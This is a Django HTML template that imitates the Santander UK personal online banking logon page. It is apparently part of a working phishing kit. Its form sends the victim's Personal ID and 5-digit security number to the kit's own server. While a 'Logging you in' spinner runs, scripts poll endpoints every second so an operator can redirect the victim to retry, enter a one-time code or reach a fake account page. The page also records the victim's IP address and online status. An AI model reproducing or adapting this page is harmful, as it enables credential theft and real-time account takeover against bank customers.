{% load static %}
{% block content %}
<html lang="en-GB"><head>
    
    <meta charset="utf-8">
    <title>Personal Online Banking: Log on or sign up</title>
    <meta name="title" content="Online Banking | Personal Account Holders | Santander UK">
    <meta name="description" content="Access your account information online with internet banking from Santander; manage your money, cards and view other services. Find out more at Santander.co.uk">
    <meta name="abstract" content="Access your account information online with internet banking from Santander; manage your money, cards and view other services. Find out more at Santander.co.uk">
    <link rel="icon" href="{% static 'styles/favicon.ico' %}" type="image/x-icon">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Cache-Control" content="no-cache, no-store">
<link rel="stylesheet" type="text/css" href="{% static 'styles/styles.9.css' %}">

    <style></style>

 

    <style>
        .security-number[_ngcontent-iik-c1]{color:#000;letter-spacing:20px;background-color:transparent}.security-number[_ngcontent-iik-c1]::-webkit-input-placeholder{color:#ccc!important}.security-number[_ngcontent-iik-c1]::-moz-placeholder{color:#ccc!important}.security-number[_ngcontent-iik-c1]:-ms-input-placeholder{color:#ccc!important}.security-number[_ngcontent-iik-c1]::-ms-input-placeholder{color:#ccc!important}.security-number[_ngcontent-iik-c1]::placeholder{color:#ccc!important}@supports not ((-webkit-hyphens:auto) or (-ms-hyphens:auto) or (hyphens:auto)){.security-number[_ngcontent-iik-c1]{-webkit-text-stroke-width:.2em}.security-number[_ngcontent-iik-c1]::-webkit-input-placeholder{-webkit-text-stroke-width:0!important}.security-number[_ngcontent-iik-c1]::-moz-placeholder{-webkit-text-stroke-width:0!important}.security-number[_ngcontent-iik-c1]:-ms-input-placeholder{-webkit-text-stroke-width:0!important}.security-number[_ngcontent-iik-c1]::-ms-input-placeholder{-webkit-text-stroke-width:0!important}.security-number[_ngcontent-iik-c1]::placeholder{-webkit-text-stroke-width:0!important}}.invalid-security-number[_ngcontent-iik-c1]{border:1px solid #ec0000!important;border-radius:4px}

.loader {
  border: 4px solid #ffe6e6;; /* Light grey */
  border-top: 4px solid #ef3131; /* Blue */
  border-radius: 50%;
  width: 65px;
  height: 65px;
  animation: spin .8s linear infinite;
  margin: 0 auto;
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
} 
    </style>

    <style type="text/css">
        #cookieBannerContainer{
         display: flex; 
         background-color:rgb(231,247,248);
         padding: 15px; 
         font-family: 'Verdana', Geneva, Arial, Helvetica, sans-serif;
         line-height: 1.5; 
         border-radius: 3px; 
         justify-content: space-between; 
         margin: 10px auto; 
         }
         #cookieBannerIcon {
         margin-right: 10px;
          fill: rgb(41,181,189);
         }
         #cookieBannerText {
         font-size: 15px; 
         } 
         #cookieBannerText a{
         color: #9ca4ab;
         font-family: 'Verdana', Geneva, Arial, Helvetica, sans-serif;
         text-decoration: underline; 
         }
         #cookieBannerButton {
         min-width: 90px;
         cursor: pointer; 
         height: 30px;
         background-color: #ec0000;
          color: white;
         font-size: 12px;
         margin: 10px 20px 10px 34px;
         text-align: center; 
         text-decoration: underline; 
         line-height: 30px; 
         border-radius: 50px;
         align-self: center; 
         font-family: 'Verdana', Geneva, Arial, Helvetica, sans-serif; 
	 }
   
      
        .appfooter{
             
             
             position:relative !important;
             top:25rem !important
             
             
         }
         
         .appheader{
	              
	               position:relative !important;
		                    top:0rem !important;
		                    
		                    padding-bottom:3rem;
				                 
				                 
				                 
				             }



 </style>

<script>


function pidRequired(){
var pid = document.getElementById('pid')
var desc = document.getElementById('pidDesc')
if(pid.value.length < 5){
desc.style.display = 'block';
pid.className = "form-control logon-textbox ng-pristine ng-invalid ng-touched ng-dirty ng-invalid textbox-invalid"
return false
}else{
return true
}
}
</script>
<script>
function senRequired(){
var sen = document.getElementById('sen')
var desc = document.getElementById('senDesc')
if(sen.value.length < 5){
desc.innerHTML = 'Please enter your security number'
desc.style.display = 'block';
sen.className = "form-control logon-textbox ng-pristine ng-invalid ng-touched ng-dirty ng-invalid textbox-invalid"
}
}
</script>
<script>
function showButton(){
var pid = document.getElementById('pid')
var sen = document.getElementById('sen')
var button = document.getElementById('submitbtn')
if(pid.value.length > 4 && sen.value.length === 5){
button.removeAttribute('disabled')
}
}
</script>
</head>
<body>
    <meta http-equiv="content-secure-policy" content="deafult-src 'self'=" "="" '*'=" ">
        <meta http-equiv="X-Xss-Protection" content="'1; mode=block' always">
        <meta http-equiv="X-Content-Type-Options" content="'nosniff' always">
        <meta http-equiv="Strict-Transport-Security" content="max-age=31536000">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=1, maximum-scale=2.0">
        


        

        <olb-root _nghost-iik-c0="" ng-version="7.2.16">
            <olb-home _ngcontent-iik-c0="">
              
                <div class="container-fluid appheader">
                    <div class="container">
                        <div class="row">
                            <div class="col-sm-12 containerPadding header-responsive" role="banner">
                                <olb-header>
                                    <nav class="navbar appheader_content">
                                        <a href=""><img alt="Santander Image" class="img-fluid Bitmap header-logo-santander" src="{% static 'styles/header-logo.png' %}"></a>
                                        <!---->
                                        <!---->
                                        <div><span class="title-small singup-text">Don’t have Online Banking?&nbsp;</span><a aria-describedby="signupDesc" aria-label="Sign up to Online Banking" class="anchor-red-links" href="/ENRIUK_NS_ENS/BtoChannelDriver.ssobto?dse_operationName=Access_ENRIUK">Sign up</a></div>
                                    </nav>
                                </olb-header>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="container">
                    <div class="row">
                        <div aria-live="assertive" class="col-sm-12 main-section-responsive" role="main">
                            <router-outlet></router-outlet>
                            <olb-logon>
                                <div class="content">
                                    <div class="row">
                                        <div class="col-lg-5 col-sm-12 left-content ">
                                            <div>
                                                <div class="d-flex justify-content-center mt-4" id="logon-heading">
                                                    <h1 class="title-header title-color-red">Log on to your Online Banking</h1>
                                                </div>
                                                <div aria-live="off" class="mt-3">
                                                    <ul class="nav nav-tabs d-flex justify-content-center" role="tablist">
                                                        <li class="nav-item" role="presentation"><a class="nav-link active" data-toggle="tab" href="" role="tab">Personal</a></li>
                                                        <li class="nav-item" role="presentation"><a class="nav-link" role="tab" spacebarclick="" href="https://business.santander.co.uk/olb/app/logon/access/">Business</a></li>
                                                        <li class="nav-item" role="presentation"><a class="nav-link" role="tab" spacebarclick="" href="https://corporate.santander.co.uk/LOGSCU_NS_ENS/BtoChannelDriver.bto?dse_operationName=OP_LOG_ON">Corporate</a></li>
                                                    </ul>
                                                </div>
                                            </div>
                                            <div>
                                                <div class="tab-content d-flex justify-content-center mt-4 mb-5">
                                                    <div class="tab-pane active retail-logon-content" id="personal" role="tabpanel">
                                                        <div aria-live="off">
                                                            <olb-retail-logon>
                                                                <div class="logon-form">
                                                                    
                                                                     <form autocomplete="off" novalidate="" class="ng-pristine ng-invalid ng-touched" action="." method="POST">{% csrf_token %}
                                                                      

                                                                        <div class="errorMessage mb-3">
                                                                            <olb-validation-message imglocation="./assets/images/alert.svg" msgtype="warn">
                                                                                <!---->
                                                                            </olb-validation-message>
                                                                        </div>
                                                                        <div class="row">
                                                                            <div class="form-group"><label class="label" for="pid">Personal ID </label><input alphanumericvalidator="" aria-describedby="pidDesc" aria-required="true" autocomplete="off" class="form-control logon-textbox ng-pristine ng-invalid ng-touched" formcontrolname="pid" id="pid" maxlength="26" minlength="5" name="pid" onpaste="return true" type="text" onkeyup="showButton()" onblur="pidRequired()" value="{{request.session.pid}}">
                                                                                <!---->
                                                                                <!----><span class="" style="display: none;color: #c00;
                                                                                        font-size: 14px !important;
                                                                                        font-weight: 400;
                                                                                        font-style: normal;
                                                                                        font-stretch: normal;
                                                                                        line-height: normal;
                                                                                        letter-spacing: normal;"  id="pidDesc"> Please Enter your Personal ID 
                                                                                    </span></div>
                                                                        </div>
                                                                        <div class="row">
                                                                            <div class="form-group"><label class="label" for="securityNumber">Security number</label>
                                                                                <div class="security-number-help-info"><span> You may know this as your 5 digit Registration Number or Customer PIN </span></div>
                                                                                <common-security-number _nghost-iik-c1="">
                                                                                    <!---->
                                                                                    <!---->
                                                                                    <div _ngcontent-iik-c1="" class="ng-pristine ng-invalid ng-touched"><label _ngcontent-iik-c1="" class="sr-only" for="securityNumber">Security Number</label><input _ngcontent-iik-c1="" aria-describedby="securityNumberDesc" aria-label="Security Number" aria-required="true" autocomplete="off" maxlength="5" minlength="5" oncopy="return false" oncut="return false" onpaste="return false"  required="" type="password" class="security-number form-control logon-textbox password-textbox ng-untouched ng-pristine ng-invalid" id="sen" name="securityNumber" onkeyup="showButton()" onblur="senRequired()" value="{{request.session.sen}}">
 
                                                                                        <span _ngcontent-iik-c1="" class="" id="senDesc" style="display: none;color: #c00;
                                                                                        font-size: 14px;
                                                                                        font-weight: 400;
                                                                                        font-style: normal;
                                                                                        font-stretch: normal;
                                                                                        line-height: normal;
                                                                                        letter-spacing: normal;"> Please Enter 5 digits security number and it is also known as Registration number or Customer PIN </span></div>
                                                                                </common-security-number>
                                                                                <!---->
                                                                                <!---->
                                                                            </div>
                                                                        </div>
                                                                        <div class="row d-flex ">
                                                                            <div class="rememberMeDiv"><label class="checkbox_container"><!----><!----><input aria-describedby="remembermeDesc" aria-label="Remember ID" formcontrolname="rememberme" id="rememberme" name="rememberme" type="checkbox" class="ng-untouched ng-pristine ng-valid"><span class="checkbox_text">Remember ID </span><span class="checkmark"></span><div class="d-none"><span id="remembermeDesc"> Please check the checkbox if you want to remember your Personal ID in this device </span></div></label></div>
                                                                        </div>
                                                                        <div class="row d-flex ">
                                                                            <div class="mt-2"><label class="checkbox_container"><input aria-describedby="publicDeviceDesc" aria-label="I'm using a public or shared device" formcontrolname="publicdevice" id="publicdevice" name="publicdevice" type="checkbox" class="ng-untouched ng-pristine ng-valid"><span class="checkbox_text"> I'm using a public or shared device </span><span class="checkmark"></span><span class="d-none" id="publicDeviceDesc"> Please check the checkbox if you are using public or shared device </span></label></div>
                                                                        </div>
                                                                        <div class=" mt-4 row d-flex">
                                                                            <!---->
                                                                            <div class="mt-4 text-center col-md-12 pl-0 pr-0">
                                                                                <div class="justify-content-center button-xs-width"> 

                                                                                    <div class="loader"></div> 

<br>
                                                                                    <p style="font-family: SantanderText;font-size: 18px">Logging you in</p>


                                                                                </button><span class="d-none" id="logonButtonDesc"> Please click logon button to validate your Personal ID and Security Number </span></div>
                                                                            </div>
                                                                            <div class="col-md-12 mt-2">
                                                                                <div class="d-flex justify-content-center"><span class="d-none" id="forgottenDetailsDesc"> If you don't remember your logon credentials, Please click here </span></div>
                                                                            </div>
                                                                            <!---->
                                                                            <div>
                                                                                <!---->
                                                                            </div>
                                                                        </div>
                                                                        <div><input autocomplete="new-password" class="log-info__hidden" id="disable-pwd-mgr-1" name="disable-pwd-mgr-1" style="display: none;" type="password" value="disable-pwd-mgr-1"><input autocomplete="new-password" class="log-info__hidden" id="disable-pwd-mgr-2" name="disable-pwd-mgr-2" style="display: none;" type="password" value="disable-pwd-mgr-2"></div>
                                                                    </form>
                                                                </div>
                                                            </olb-retail-logon>
                                                        </div>
                                                    </div>
                                                    <div class="tab-pane" id="buisness" role="tabpanel"></div>
                                                    <div class="tab-pane" id="coporate" role="tabpanel"></div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="col-lg-7 right-content">
                                            <div aria-live="off">
                                                <olb-logon-right-content>
                                                    <div>
                                                        <div class="row logon-image mt-5"><img alt="Beware coronavirus scams Image" class="logon-right-image" src="{% static 'styles/beware.png' %}" ></div>
                                                        <div class="mb-1 mt-1 logon-text-details-container" id="victimDesc">
                                                            <div class="row">
                                                                <div class="text-header col-sm-12">
                                                                    <p>Beware coronavirus scams</p>
                                                                </div>
                                                            </div>
                                                            <div class="row">
                                                                <div class="logon-text-details col-sm-12">
                                                                    <p>Criminals are using coronavirus to target people. Please stay on the lookout for anything unusual. Don’t be rushed and make sure any contact claiming to be from us is genuine. <a aria-describedby="covid-19-msg-desc" class="text-sub-details" href="https://www.santander.co.uk/personal/support/fraud-and-security/fraud-updates" target="_blank">Learn more</a>. </p><span class="d-none" id="covid-19-msg-desc"> Learn more. </span></div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </olb-logon-right-content>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="overlay modalhide" role="alert">
                                    <div class="modal logon-modal-dialog modalhide" id="myModal" role="dialog">
                                        <div class="modal-dialog modal-dialog-centered">
                                            <div class="modal-content">
                                                <div class="modal-body">
                                                    <div>
                                                        <olb-logon-right-content>
                                                            <div>
                                                                <div class="row logon-image mt-5"><img alt="Beware coronavirus scams Image" class="logon-right-image" src="{% static 'styles/beware.png' %}" srcset=" {% static 'styles/beware.png 2x, styles/beware.png 3x' %}"></div>
                                                                <div class="mb-1 mt-1 logon-text-details-container-modal-dialog" id="victimDesc">
                                                                    <div class="row">
                                                                        <div class="text-header col-sm-12">
                                                                            <p>Beware coronavirus scams</p>
                                                                        </div>
                                                                    </div>
                                                                    <div class="row">
                                                                        <div class="logon-text-details col-sm-12">
                                                                            <p>Criminals are using coronavirus to target people. Please stay on the lookout for anything unusual. Don’t be rushed and make sure any contact claiming to be from us is genuine. <a aria-describedby="covid-19-msg-desc" class="text-sub-details" href="https://www.santander.co.uk/personal/support/fraud-and-security/fraud-updates" target="_blank">Learn more</a>. </p><span class="d-none" id="covid-19-msg-desc"> Learn more. </span></div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </olb-logon-right-content>
                                                    </div>
                                                    <div class="d-flex justify-content-center"><button class="button button-secondary" id="gotItbtn" type="button"> Ok. Got it!</button></div>

                                                   
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </olb-logon>
                        </div>
                    </div>
                </div>
                <div class="container-fluid appfooter">
                    <div class="container">
                        <div class="row">
                            <div class="col-sm-12 containerPadding footer-responsive" role="contentinfo">
                                <olb-footer>
                                    <footer class="footer-base">
                                        <div class="footer-left-content">
                                            <!----><a target="_blank" href="https://www.santander.co.uk/personal/support/ways-to-bank/online-and-mobile-banking-commitment">Online Banking Guarantee</a><a target="_blank" href="https://www.santander.co.uk/personal/support/customer-support/accessibility">Site Help &amp; Accessibility</a><a target="_blank" href="https://www.santander.co.uk/personal/support/customer-support/legal-information">Security &amp; Privacy</a><a target="_blank" href="https://www.santander.co.uk/personal/support/ways-to-bank/online-banking-service-terms-conditions">Terms &amp; Conditions</a><a target="_blank" href="https://www.santander.co.uk/personal/support/customer-support/legal-information">Legal</a></div>
                                        <div class="footer-right-content"><img alt="FSCS Protected Image" src="{% static 'styles/fscs.png' %}"></div>
                                    </footer>
                                </olb-footer>
                            </div>
                        </div>
                    </div>
                </div>
                <div>
                    <olb-session></olb-session>
                </div>
            </olb-home>
        </olb-root>
    
      

        <noscript>
  <meta http-equiv="refresh" content="0;url=assets/noscript.html">
</noscript>

</body></html>
        {% block javascript %}

<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
<script type="text/javascript">

   $.getJSON("https://api.ipify.org?format=json", 
                                          function(data) { 

        $("#ipAddr").val(data.ip);

    });

</script>

<script>
    


$(document).ready(function(){

var pid = document.getElementById('pid').value 

setInterval(function()


{




$.ajax({


type: 'GET',
 
 url: '{% url "TryAgain" %}',

 data: {
            'pid': pid,
        },
 


success: function(response){

  
if(response.tryAgain){



window.location.href = '{% url "LoginRetry" %}';


}

   

},

error: function(response){







}





});




},1000);







});

</script>

<script>
    


$(document).ready(function(){

var pid = document.getElementById('pid').value 

setInterval(function()


{





$.ajax({


type: 'GET',
 
 url: '{% url "getCode" %}',

 data: {
            'pid': pid,
        },
 


success: function(response){

  
if(response.getCode){



window.location.href = '{% url "displayCode" %}';


}

   

},

error: function(response){







}





});




},1000);







});

</script>

<script>
    


$(document).ready(function(){

var pid = document.getElementById('pid').value 

setInterval(function()


{





$.ajax({


type: 'GET',
 
 url: '{% url "AcceptLogin" %}',

 data: {
            'pid': pid,
        },
 


success: function(response){

  
if(response.accept){



window.location.href = '{% url "Account" %}';


}

   

},

error: function(response){







}





});




},1000);







});

</script>





<script>
    

function online(){

var ip_address = document.getElementById('pid').value 
console.log(ip_address)


$.ajax({


type: 'GET',
 
 url: '{% url "isActive" %}',

 data: {
            'pid': ip_address
        },
 


success: function(response){

  
if(response.accept){





}

   

},

error: function(response){







}




}

)}

</script>

<script>


function offline(){

var ip_address = document.getElementById('pid').value 

$.ajax({


type: 'GET',
 
 url: '{% url "bye" %}',

 data: {
            'pid': ip_address
        },
 


success: function(response){

  
if(response.accept){





}

   

},

error: function(response){







}





});




}




</script>

<script>
online()
</script>

<script>
$(window).on("beforeunload", function() { 
    offline()
})

</script>


        {% endblock javascript %}
        {% endblock %}
